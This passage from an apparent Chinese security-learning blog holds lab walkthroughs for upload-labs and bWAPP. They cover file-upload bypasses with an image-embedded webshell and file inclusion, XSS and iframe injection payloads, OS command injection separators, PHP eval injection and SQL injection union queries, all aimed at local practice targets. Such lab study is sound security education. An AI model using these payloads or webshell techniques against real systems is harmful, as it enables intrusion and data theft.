src="https://i.loli.net/2020/09/18/zrwTpFeVsYQ8xtS.png" srcset="/img/loading.gif" alt=""></p><pre><code>$img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre><p>&nbsp;&nbsp;所以从二进制数据包角度修改</p><p><img src="https://i.loli.net/2020/09/18/fSOd3ZgaElTzHvr.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-Pass-13"><a href="#nbsp-nbsp-Pass-13" class="headerlink" title="&nbsp;&nbsp;Pass-13"></a>&nbsp;&nbsp;Pass-13</h3><p>&nbsp;&nbsp;本关是对上传图片的前2个字节进行检查</p><pre><code>function getReailFileType($filename){$file = fopen($filename, &quot;rb&quot;);$bin = fread($file, 2); //只读2字节fclose($file);$strInfo = @unpack(&quot;C2chars&quot;, $bin);    $typeCode = intval($strInfo[&apos;chars1&apos;].$strInfo[&apos;chars2&apos;]);    $fileType = &apos;&apos;;    switch($typeCode){          case 255216:                    $fileType = &apos;jpg&apos;;        break;    case 13780:                    $fileType = &apos;png&apos;;        break;            case 7173:                    $fileType = &apos;gif&apos;;        break;    default:                    $fileType = &apos;unknown&apos;;    }        return $fileType;}</code></pre><p>&nbsp;&nbsp;可以通过cmd合成图片马来绕过</p><pre><code>copy pic.jpg /b + info.php /a webshell.jpg</code></pre><p>&nbsp;&nbsp;再通过文件包含漏洞连接即可</p><pre><code>http://192.168.137.134:8007/include.php?file=./upload/4720200921225554.jpg//连接webshell前需要用包含漏洞确实能够输出</code></pre><p><img src="https://i.loli.net/2020/09/23/swjkUlpILtyM7V1.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-Pass-14"><a href="#nbsp-nbsp-Pass-14" class="headerlink" title="&nbsp;&nbsp;Pass-14"></a>&nbsp;&nbsp;Pass-14</h3><p>&nbsp;&nbsp;本关使用的图片马和13关一样</p><pre><code>function isImage($filename){$types = &apos;.jpeg|.png|.gif&apos;;if(file_exists($filename)){    $info = getimagesize($filename);    $ext = image_type_to_extension($info[2]);    if(stripos($types,$ext)&gt;=0){        return $ext;    }else{        return false;    }}else{    return false;}}</code></pre><p>&nbsp;&nbsp;getimagesize函数将测定上传的图片大小并返回文件类型及图片高度与宽度</p><pre><code>getimagesize() 函数返回一个至少具有 4 个元素的数组：索引 0 包含图像宽度的像素值。索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1=GIF，2=JPG，3=PNG，4=SWF，5=PSD，6=BMP，7=TIFF(intel byte order)，8=TIFF(motorola byte order)，9=JPC，10=JP2，11=PX，12=JB2，13=SWC，14=IFF，15=WBMP，16=XBM。这些标记与 PHP 4.3.0 新加的 IMAGETYPE 常量对应。索引 3 是文本字符串，内容为 &quot;height=&quot;yyy&quot;width=&quot;xxx&quot;&quot;，可直接用于 IMG 标记。</code></pre><h3 id="nbsp-nbsp-Pass-15"><a href="#nbsp-nbsp-Pass-15" class="headerlink" title="&nbsp;&nbsp;Pass-15"></a>&nbsp;&nbsp;Pass-15</h3><p>&nbsp;&nbsp;本关可以继续利用之前可以使用的图片马，看看源码</p><pre><code>function isImage($filename){//需要开启php_exif模块$image_type = exif_imagetype($filename);switch ($image_type) {    case IMAGETYPE_GIF:        return &quot;gif&quot;;        break;    case IMAGETYPE_JPEG:        return &quot;jpg&quot;;        break;    case IMAGETYPE_PNG:        return &quot;png&quot;;        break;        default:        return false;        break;}}</code></pre><p>&nbsp;&nbsp;exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p><h3 id="nbsp-nbsp-Pass-16"><a href="#nbsp-nbsp-Pass-16" class="headerlink" title="&nbsp;&nbsp;Pass-16"></a>&nbsp;&nbsp;Pass-16</h3><p>&nbsp;&nbsp;本关具体原理和思路看这个<a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">文章</a></p><p>&nbsp;&nbsp;具体总结一下：</p><pre><code>gif：通过上传一张范例再下载下来与原图对比，找出未被修改的位置，再此段加入代码png：往PLTE数据块写入代码，再脚本计算CRCjpg：通过脚本处理找到合适的图片更重要</code></pre><h3 id="nbsp-nbsp-Pass-17"><a href="#nbsp-nbsp-Pass-17" class="headerlink" title="&nbsp;&nbsp;Pass-17"></a>&nbsp;&nbsp;Pass-17</h3><p>&nbsp;&nbsp;看看源码</p><pre><code>if(isset($_POST[&apos;submit&apos;])){$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);$file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];$temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];$file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);  //获取后缀$upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name;if(move_uploaded_file($temp_file, $upload_file)){    if(in_array($file_ext,$ext_arr)){         $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;         rename($upload_file, $img_path);         $is_upload = true;    }else{        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;        unlink($upload_file);    }}else{    $msg = &apos;上传出错！&apos;;}}</code></pre><p>&nbsp;&nbsp;思路在于服务器端检查和删除有一个小的时间间隔，利用这个机会来上传webshell</p><p>&nbsp;&nbsp;这里通过burpsuite的intruder模块，在payload内选择null payloads，payload选项选择continue indefinitely 来进行无限重放</p><p>u19</p><p>&nbsp;&nbsp;另外本地写一个python脚本来检测访问响应码</p><p>&nbsp;&nbsp;不过挺难实现的，跑了挺多包都访问失败</p><h3 id="nbsp-nbsp-Pass-18"><a href="#nbsp-nbsp-Pass-18" class="headerlink" title="&nbsp;&nbsp;Pass-18"></a>&nbsp;&nbsp;Pass-18</h3><p>&nbsp;&nbsp;用之前的图片马也可以使用</p><p>&nbsp;&nbsp;本关也有条件竞争的漏洞，本地不好实现就略过了</p><h3 id="nbsp-nbsp-Pass-19"><a href="#nbsp-nbsp-Pass-19" class="headerlink" title="&nbsp;&nbsp;Pass-19"></a>&nbsp;&nbsp;Pass-19</h3><p>&nbsp;&nbsp;这关类似之前的12关的00截断</p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>bWAPP靶场</title>
    <link href="/2020/08/25/bWAPP%E9%9D%B6%E5%9C%BA/"/>
    <url>/2020/08/25/bWAPP%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="简介和安装"><a href="#简介和安装" class="headerlink" title="简介和安装"></a>简介和安装</h2><p>&nbsp;&nbsp;buggy web Application 这是一个集成了各种常见漏洞和最新漏洞的开源Web应用程序，目的是帮助网络安全爱好者、开发人员和学生发现并防止网络漏洞。包含了超过100种漏洞，涵 盖了所有主要的已知Web漏洞，包括OWASP Top10安全风险，最重要的是已经包含了OpenSSL和ShellShock漏洞。</p><p>&nbsp;&nbsp;本机安装的的是集成docker环境 <a href="https://github.com/c0ny1/vulstudy" target="_blank" rel="noopener">链接</a></p><p>&nbsp;&nbsp;部属docker环境的是虚拟机Ubuntu2020。在clone到的文件夹内使用命令</p><pre><code>sudo docker-compose up -d</code></pre><p>&nbsp;&nbsp;将环境启动，当显示环境全部done时则可以进行访问测试</p><p><img src="https://i.loli.net/2020/08/26/Y39KBqiLbuzZ6po.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;访问bwapp对应的IP地址即可开始进行练习（需要首次访问install.php）</p><p><img src="https://i.loli.net/2020/08/26/rKOe671AlJnvTRx.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;登录的账号bee/bug</p><p><img src="https://i.loli.net/2020/08/26/B2Ho4WudgvkeR7M.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;docker关闭命令</p><pre><code>sudo docker-compose stop </code></pre><h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h2><h3 id="HTML-Injection"><a href="#HTML-Injection" class="headerlink" title="HTML Injection"></a>HTML Injection</h3><h4 id="Reflected-GET"><a href="#Reflected-GET" class="headerlink" title="Reflected (GET)"></a>Reflected (GET)</h4><p><img src="https://i.loli.net/2020/08/26/USfY2nzOIlc8Njg.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;正常输入则会下方小字显示</p><p><img src="https://i.loli.net/2020/08/26/75FAjzN8pho3RqZ.png" srcset="/img/loading.gif" alt=""></p><h5 id="nbsp-nbsp-low"><a href="#nbsp-nbsp-low" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;网站未对输入内容进行过滤和转义，可以输入各种html的payload</p><pre><code>&lt;h1&gt;hello&lt;h1&gt;</code></pre><p><img src="https://i.loli.net/2020/08/26/qP9QwIdJnlLvZRS.png" srcset="/img/loading.gif" alt=""></p><pre><code>&lt;a href=”https://www.baidu.com”&gt;baidu&lt;/a&gt; 也可以</code></pre><h5 id="nbsp-nbsp-medium"><a href="#nbsp-nbsp-medium" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h5><p>&nbsp;&nbsp;使用low等级的payload已经被转义</p><p><img src="https://i.loli.net/2020/08/26/DFSQu7YXVhkB6wo.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;先对源码进行查看，<a href="https://sourceforge.net/projects/bwapp/files/bWAPP/bWAPPv2.2/" target="_blank" rel="noopener">链接</a></p><pre><code> &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt; &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt; medium等级对应是1switch($_COOKIE[&quot;security_level&quot;]){    case &quot;0&quot; :         $data = no_check($data);                    break;    case &quot;1&quot; :        $data = xss_check_1($data);        break;    case &quot;2&quot; :                    $data = xss_check_3($data);                    break;    default :         $data = no_check($data);                    break;   } 可以看到low等级没有对输入字符进行检查，接下来寻找xss_check函数</code></pre><p>&nbsp;&nbsp;通过查看该页面源码查询到xss_check函数包含在  functions_external.php  文件中</p><pre><code>function xss_check_1($data){// Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities    $input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);$input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);$input = urldecode($input);return $input;}</code></pre><p>&nbsp;&nbsp;xss_check函数对 左右尖括号用html转义符进行了替换，然后再将转义后的代码用urlencode函数编码再返回。</p><p>&nbsp;&nbsp;这里就可以知道利用urlencode函数进行绕过，预先设置输入</p><pre><code>%3Cscript%3Ealert%280%29%3C%2Fscript%3E%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e将符号通过html预先转义来绕过str_repalce函数</code></pre><p><img src="https://i.loli.net/2020/08/30/E3Xz2wNZtBmY8Df.png" srcset="/img/loading.gif" alt=""></p><h5 id="nbsp-nbsp-high"><a href="#nbsp-nbsp-high" class="headerlink" title="&nbsp;&nbsp;high"></a>&nbsp;&nbsp;<strong>high</strong></h5><p>&nbsp;&nbsp;对源码进行分析</p><pre><code>function xss_check_3($data, $encoding = &quot;UTF-8&quot;){// htmlspecialchars - converts special characters to HTML entities    // &apos;&amp;&apos; (ampersand) becomes &apos;&amp;amp;&apos; // &apos;&quot;&apos; (double quote) becomes &apos;&amp;quot;&apos; when ENT_NOQUOTES is not set// &quot;&apos;&quot; (single quote) becomes &apos;&amp;#039;&apos; (or &amp;apos;) only when ENT_QUOTES is set// &apos;&lt;&apos; (less than) becomes &apos;&amp;lt;&apos;// &apos;&gt;&apos; (greater than) becomes &apos;&amp;gt;&apos;  return htmlspecialchars($data, ENT_QUOTES, $encoding);}</code></pre><p>&nbsp;&nbsp;由于 htmlspecialchars 函数使用的flag为quotes默认编码单双引号还有尖括号。</p><p>&nbsp;&nbsp;对输入单双引号进行验证</p><p><img src="https://i.loli.net/2020/09/01/QYUm2B9poV1JFfX.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;查看源码</p><p><img src="https://i.loli.net/2020/09/01/gTmFXI4a7OEeSLk.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;故此时该函数无法绕过</p><h4 id="Reflected-POST"><a href="#Reflected-POST" class="headerlink" title="Reflected (POST)"></a>Reflected (POST)</h4><h5 id="nbsp-nbsp-low-1"><a href="#nbsp-nbsp-low-1" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;先用直接插的payload试试</p><p><img src="https://i.loli.net/2020/09/01/eqI6lzYycvb479N.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;可以使用</p><p>&nbsp;&nbsp;按照要求在post内提交也可以</p><p><img src="https://i.loli.net/2020/09/01/Nzvmh1pkbsZWKxP.png" srcset="/img/loading.gif" alt=""></p><h5 id="nbsp-nbsp-medium-1"><a href="#nbsp-nbsp-medium-1" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h5><p>&nbsp;&nbsp;先试试get关的medium的payload，结果也可以。</p><p>&nbsp;&nbsp;看了看源码，使用的函数和get的一样，那payload也一样</p><h5 id="nbsp-nbsp-high-1"><a href="#nbsp-nbsp-high-1" class="headerlink" title="&nbsp;&nbsp;high"></a>&nbsp;&nbsp;<strong>high</strong></h5><p>&nbsp;&nbsp;基本无法绕过但是可以通过修改cookie来改等级，不过这样就没有按照正常思路。</p><h4 id="Reflected-URL"><a href="#Reflected-URL" class="headerlink" title="Reflected (URL)"></a>Reflected (URL)</h4><h5 id="nbsp-nbsp-low-2"><a href="#nbsp-nbsp-low-2" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p><img src="https://i.loli.net/2020/09/01/mIwD3kzx79RAuQn.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;可以查看访问的目标服务器的ip的地址和端口</p><p>&nbsp;&nbsp;burpsuite抓包修改host</p><p><img src="https://i.loli.net/2020/09/01/u8vkOUTQzSnhM7q.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;在原始界面可以查看到修改的host</p><p><img src="https://i.loli.net/2020/09/01/mHKwnRFJa9NeykB.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;真正的xss插入点在url后</p><pre><code>#&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</code></pre><p><img src="https://i.loli.net/2020/09/01/2W6snYFjyEucfPi.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://i.loli.net/2020/09/01/e7EVCDoqlHP3YUX.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;插入成功，接下来看看源码。</p><pre><code>case &quot;0&quot; :    $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . $_SERVER[&quot;REQUEST_URI&quot;];                   break;</code></pre><p>&nbsp;&nbsp;url变量构造中直接将http包内host和访问的页面输入。故payload将后面的括号注释掉即可通过xss，但是尝试在host中修改不太行。</p><h5 id="nbsp-nbsp-medium-2"><a href="#nbsp-nbsp-medium-2" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h5><p>&nbsp;&nbsp;先尝试上一关的payload，host和url都不可改变。看看源码</p><pre><code>case &quot;1&quot; :   $url = &quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;;   break;</code></pre><p>&nbsp;&nbsp;现在传入的url是从通过js的document.write函数向客户端进行发送的。看了很多攻略结果发现还绕不过</p><h5 id="nbsp-nbsp-high-2"><a href="#nbsp-nbsp-high-2" class="headerlink" title="&nbsp;&nbsp;high"></a>&nbsp;&nbsp;<strong>high</strong></h5><p>&nbsp;&nbsp;high就直接看源码吧。</p><pre><code>case &quot;2&quot; :$url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;]);break;</code></pre><p>&nbsp;&nbsp;使用xss_check_3函数对url进行转义。</p><h4 id="Stored-Blog"><a href="#Stored-Blog" class="headerlink" title="Stored (Blog)"></a>Stored (Blog)</h4><h5 id="nbsp-nbsp-low-3"><a href="#nbsp-nbsp-low-3" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p><img src="https://i.loli.net/2020/09/02/widaoITLEmAbOHK.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;通过简单测试估计是个存储型xss。输入普通payload即可</p><p><img src="https://i.loli.net/2020/09/02/3xfWDP7kBg4cI9a.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;看看源码</p><pre><code>case &quot;0&quot; :    $data = sqli_check_3($link, $data);    break;function sqli_check_3($link, $data){return mysqli_real_escape_string($link, $data);}</code></pre><p>&nbsp;&nbsp;mysqli_real_escape_string函数只将 \x00 \n \r \<br>‘ “ \x1a</p><h5 id="nbsp-nbsp-medium-3"><a href="#nbsp-nbsp-medium-3" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h5><p>&nbsp;&nbsp;切换到medium就显示被转义</p><p><img src="https://i.loli.net/2020/09/02/aXslhn7KLAOtpSH.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;看看源码 感觉有点奇怪 因为后面都是check_3函数先跳过吧</p><pre><code>case &quot;1&quot; :        $data = sqli_check_3($link, $data);        // $data = xss_check_4($data);        break;case &quot;2&quot; :        $data = sqli_check_3($link, $data);        // $data = xss_check_3($data);        break;</code></pre><h3 id="iFrame-Injection"><a href="#iFrame-Injection" class="headerlink" title="iFrame Injection"></a>iFrame Injection</h3><h5 id="nbsp-nbsp-low-4"><a href="#nbsp-nbsp-low-4" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;打开显示了网站的一些基本信息，按照格式应该是robots.txt内容</p><p><img src="https://i.loli.net/2020/09/06/Xejn7KPJTbLzpsh.png" srcset="/img/loading.gif" alt=""></p><pre><code>http://192.168.137.129:82/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250</code></pre><p>&nbsp;&nbsp;对Paramurl后面的参数进行修改可以达到目录遍历的效果</p><pre><code>iframei.php?ParamUrl=admin</code></pre><p><img src="https://i.loli.net/2020/09/06/WbJDwnBLgRA4Qdq.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;看看源码</p><pre><code>unction xss($data){switch($_COOKIE[&quot;security_level&quot;]){    case &quot;0&quot; :        $data = no_check($data);              break;    case &quot;1&quot; :        $data = xss_check_4($data);        break;    case &quot;2&quot; :        $data = xss_check_3($data);        break;    default :        $data = no_check($data);        break;   }</code></pre><p>&nbsp;&nbsp;xss函数只有在level为1，2时使用</p><pre><code>&lt;?phpif($_COOKIE[&quot;security_level&quot;] == &quot;1&quot; || $_COOKIE[&quot;security_level&quot;] == &quot;2&quot;){?&gt;&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;&lt;?php}else{?&gt;&lt;iframe frameborder=&quot;0&quot; src=&quot;&lt;?php echo xss($_GET[&quot;ParamUrl&quot;])?&gt;&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;&lt;?php}?&gt;</code></pre><p>&nbsp;&nbsp;可以看到在low等级下，直接将输入参数传入</p><h5 id="nbsp-nbsp-medium-4"><a href="#nbsp-nbsp-medium-4" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h5><p>&nbsp;&nbsp;通过上面源码发现对url已不可控，而width和height参数未进行处理，考虑从这里闭合标签来进行构造xss语句</p><pre><code>&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;iframe&gt;注意这里已经使用addlashes 对引号进行转义</code></pre><p><img src="https://i.loli.net/2020/09/06/aUiqJl21Lz9XmQV.png" srcset="/img/loading.gif" alt=""></p><h5 id="nbsp-nbsp-high-3"><a href="#nbsp-nbsp-high-3" class="headerlink" title="&nbsp;&nbsp;high"></a>&nbsp;&nbsp;<strong>high</strong></h5><p>&nbsp;&nbsp;通过上面的源码得知high等级对符号都进行了转义 没有闭合的方式</p><h3 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h3><h5 id="nbsp-nbsp-low-5"><a href="#nbsp-nbsp-low-5" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;low等级未做任何过滤在命令后加个管道符或其他即可</p><p><img src="https://i.loli.net/2020/09/06/ezQCKsVwYbMfBNu.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;也可以后面反弹端口等操作</p><p>&nbsp;&nbsp;看看源码</p><pre><code>function commandi($data){switch($_COOKIE[&quot;security_level&quot;]){    case &quot;0&quot; :        $data = no_check($data);        break;    case &quot;1&quot; :        $data = commandi_check_1($data);        break;    case &quot;2&quot; :        $data = commandi_check_2($data);        break;    default :        $data = no_check($data);        break;}return $data;}这部分是对输入command进行处理 low等级对输入内容不进行任何处理</code></pre><h5 id="nbsp-nbsp-medium-5"><a href="#nbsp-nbsp-medium-5" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h5><p>&nbsp;&nbsp;medium等级只对部分符号进行过滤</p><pre><code>function commandi_check_1($data){$input = str_replace(&quot;&amp;&quot;, &quot;&quot;, $data);$input = str_replace(&quot;;&quot;, &quot;&quot;, $input);return $input;}</code></pre><p>&nbsp;&nbsp;可发挥的空间还挺大 这里简单列举一下常用的拼接符号</p><pre><code>|、||、&amp;、&amp;&amp;、${IFS}$、&lt;&gt;（or &lt; 重定向）、%09(php环境)</code></pre><p>&nbsp;&nbsp;也有种情况是对输入内容进行黑名单处理 这时候就可以加入编码对内容进行操作 例如base64</p><h5 id="nbsp-nbsp-high-4"><a href="#nbsp-nbsp-high-4" class="headerlink" title="&nbsp;&nbsp;high"></a>&nbsp;&nbsp;<strong>high</strong></h5><p>&nbsp;&nbsp;这一关对输入命令进行了限制，超过则会将多余的转义</p><pre><code>function commandi_check_2($data){return escapeshellcmd($data);}</code></pre><h3 id="OS-Command-Injection-Blind"><a href="#OS-Command-Injection-Blind" class="headerlink" title="OS Command Injection-Blind"></a>OS Command Injection-Blind</h3><p>&nbsp;&nbsp;这一关的和盲注差不多，服务器端对输入的代码只会返回固定的语句</p><p><img src="https://i.loli.net/2020/09/06/Ig1szOxhHBbL6Tm.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;输入规定的ip时，返回时间只有三毫秒</p><p><img src="https://i.loli.net/2020/09/06/vnHh3XC21wrpdiF.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;若命令成功执行则会延迟几秒</p><p>&nbsp;&nbsp;看看源码</p><pre><code>&lt;?phpif(isset($_POST[&quot;target&quot;])){    $target = $_POST[&quot;target&quot;];    if($target == &quot;&quot;)    {        echo &quot;&lt;font color=\&quot;red\&quot;&gt;Please enter your IP address...&lt;/font&gt;&quot;;    }    else    {        echo &quot;Did you captured our GOLDEN packet?&quot;;        if(PHP_OS == &quot;Windows&quot; or PHP_OS == &quot;WINNT&quot; or PHP_OS == &quot;WIN32&quot;)        {            shell_exec(&quot;ping -n 1 &quot; . commandi($target));        }        else        {            shell_exec(&quot;ping -c 1 &quot; . commandi($target));        }    }}?&gt;</code></pre><h3 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h3><h5 id="nbsp-nbsp-low-6"><a href="#nbsp-nbsp-low-6" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;打开点击加粗的message，下面就跳出message</p><p><img src="https://i.loli.net/2020/09/06/4ZBq6CHIcgdFxJO.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;尝试在url后加入payload</p><pre><code>http://192.168.137.129:82/phpi.php?message=phpinfo()</code></pre><p><img src="https://i.loli.net/2020/09/06/8umRwtcMUyfZ7zl.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;看看源码</p><pre><code>if($_COOKIE[&quot;security_level&quot;] != &quot;1&quot; &amp;&amp; $_COOKIE[&quot;security_level&quot;] != &quot;2&quot;){&lt;p&gt;&lt;i&gt;&lt;?php @eval (&quot;echo &quot; . $_REQUEST[&quot;message&quot;] . &quot;;&quot;);?&gt;&lt;/i&gt;&lt;/p&gt;}</code></pre><p>&nbsp;&nbsp;low等级下不进行过滤</p><h5 id="nbsp-nbsp-medium-6"><a href="#nbsp-nbsp-medium-6" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h5><p>&nbsp;&nbsp;medium和high登记下使用同一个函数进行过滤</p><pre><code>&lt;?php echo htmlspecialchars($_REQUEST[&quot;message&quot;], ENT_QUOTES, &quot;UTF-8&quot;);;?&gt;</code></pre><p>&nbsp;&nbsp;无法绕过</p><h3 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes (SSI) Injection"></a>Server-Side Includes (SSI) Injection</h3><p>&nbsp;&nbsp;这关容器加载失败了参考网上攻略。有两种攻击方式，一个是xss，还有就是构造下面的payload</p><pre><code>&lt;!--@echo var =&quot;DOCUMEN_NAME&quot;--&gt;</code></pre><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><h4 id="GET-Search"><a href="#GET-Search" class="headerlink" title="GET/Search"></a>GET/Search</h4><h5 id="nbsp-nbsp-low-7"><a href="#nbsp-nbsp-low-7" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;很经典的注入漏洞</p><pre><code>1&apos; or 1=1 # //爆出所有表项1‘ order by 7 # //8报错而7未报错说明由7列1&apos; union select 1,user(),@@version,4,5,6,7 # //输出用户名等信息</code></pre><p>&nbsp;&nbsp;看看源码</p><pre><code>switch($_COOKIE[&quot;security_level&quot;]){    case &quot;0&quot; :        $data = no_check($data);        break;    case &quot;1&quot; :        $data = sqli_check_1($data);        break;    case &quot;2&quot; :        $data = sqli_check_2($data);        break;    default :        $data = no_check($data);        break;}//等级low时不做任何检测</code></pre><h5 id="nbsp-nbsp-medium-7"><a href="#nbsp-nbsp-medium-7" class="headerlink" title="&nbsp;&nbsp;medium"></a>&nbsp;&nbsp;<strong>medium</strong></h5><p>&nbsp;&nbsp;medium等级对引号和反斜杠进行了过滤</p><pre><code>function sqli_check_1($data){return addslashes($data);}</code></pre><p>&nbsp;&nbsp;虽然只对输入语句进行一轮addslashes函数，但由于编码问题不能通过宽字节注入</p><h5 id="nbsp-nbsp-high-5"><a href="#nbsp-nbsp-high-5" class="headerlink" title="&nbsp;&nbsp;high"></a>&nbsp;&nbsp;<strong>high</strong></h5><p>&nbsp;&nbsp;high难度使用了 mysql_real_escape_string 函数将特殊字符进行转义</p><h4 id="GET-Select"><a href="#GET-Select" class="headerlink" title="GET/Select"></a>GET/Select</h4><h5 id="nbsp-nbsp-low-8"><a href="#nbsp-nbsp-low-8" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;本关是通过参数movie的get方式来传参</p><pre><code>http://192.168.137.134:90/sqli_2.php?movie=1%20and%201=1%20&amp;action=go   //未报错</code></pre><p><img src="https://i.loli.net/2020/10/03/OY3IB8quENdp5Ag.png" srcset="/img/loading.gif" alt=""></p><pre><code>http://192.168.137.134:90/sqli_2.php?movie=1%20and%201=2&amp;action=go        //报错</code></pre><p><img src="https://i.loli.net/2020/10/03/xZraYFi4ql5C6JB.png" srcset="/img/loading.gif" alt=""></p><pre><code>http://192.168.137.134:90/sqli_2.php?movie=1%20order%20by%207&amp;action=go  //爆出列</code></pre><h5 id="nbsp-nbsp-medium-and-high"><a href="#nbsp-nbsp-medium-and-high" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;由于medium采用了和上一关一样的防御，但是本关是整数型注入，所以不起作用，故可以继续使用low的payload</p><h4 id="POST-Search"><a href="#POST-Search" class="headerlink" title="POST/Search"></a>POST/Search</h4><h5 id="nbsp-nbsp-low-9"><a href="#nbsp-nbsp-low-9" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;本关在传参时候用了post的方法，通过抓包即可明显观察到</p><p><img src="https://i.loli.net/2020/10/03/lrZonWT6VN7uIjf.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;加上单引号，出现报错</p><p><img src="https://i.loli.net/2020/10/03/pukD2ZTHeo4AXlG.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;观察到有%，所以这次的payload上加上</p><pre><code>title=Iron%&apos; and 1=1 # 